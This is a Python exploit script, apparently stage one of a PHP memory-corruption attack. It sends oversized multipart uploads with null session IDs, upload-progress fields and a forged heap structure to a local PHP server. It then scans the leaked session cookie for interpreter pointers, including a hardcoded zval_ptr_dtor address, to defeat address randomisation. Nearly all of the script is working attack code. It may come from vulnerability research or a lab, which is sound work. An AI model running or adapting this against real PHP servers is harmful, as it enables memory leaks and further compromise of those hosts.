import os
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart, parse_cookie, chunk_base_from_cookie
t = Target("http://127.0.0.1:18113/index.php", timeout=120, verbose=False)
SID = b"attacksessionid0001"
def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

# Stage 1: get the chunk base
rotate()
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
time.sleep(0.2)
parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(841):
    parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
import struct
forge = bytearray(b"A" * 79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
raw = parse_cookie(resp)
if raw:
    chunk_base = chunk_base_from_cookie(raw)
    print(f"chunk base = 0x{chunk_base:x}")
    # zval_ptr_dtor = 0x740cf3ef7eb60 (from gdb)
    zval_ptr_dtor = 0x740cf3ef7eb60
    # The chunk contains the zval_ptr_dtor pointer; scan the leaked cookie for it
    ptrs = [int.from_bytes(raw[i:i+8], "little") for i in range(0, len(raw)-8, 8)]
    zptr_hits = [i for i, v in enumerate(ptrs) if v == zval_ptr_dtor]
    print(f"zval_ptr_dtor (0x{zval_ptr_dtor:x}) in cookie: {len(zptr_hits)} hits at offsets {[hex(i) for i in zptr_hits[:10]]}")
    # Also check the libphp-range pointers
    libptrs = [(i, v) for i, v in enumerate(ptrs) if 0x740cf3e00000 <= v < 0x740cf4000000]
    print(f"libphp-range ptrs in cookie: {len(libptrs)}")
    for i, v in libptrs[:15]:
        print(f"  offset {i}: 0x{v:x}")
    print(f"\ncookie length: {len(raw)}B")
else:
    print("NO COOKIE (stage 1 failed)")
